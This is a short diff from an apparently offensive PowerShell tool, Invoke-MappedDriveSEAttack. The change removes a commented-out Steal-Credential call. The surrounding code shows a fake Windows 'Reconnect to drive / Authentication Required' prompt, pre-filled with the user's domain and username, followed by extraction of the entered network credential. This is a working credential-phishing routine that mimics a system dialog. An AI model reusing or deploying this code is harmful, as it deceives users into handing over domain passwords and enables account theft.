@@ -94,8 +94,7 @@ Function Invoke-MappedDriveSEAttack
     $credentials = @()
     Do
     {
-        #$testCred = Steal-Credential -driveLetter $Drive
-				
+
         $cred = $host.ui.promptforcredential('Reconnect to '+$Drive,'Windows is unable to access '+$Drive+'                                    Authtication Required. ',$env:UserDomain + '\' + $env:UserName,$env:UserDomain)
 				
         $UserDefDomain = $cred.GetNetworkCredential().Domain
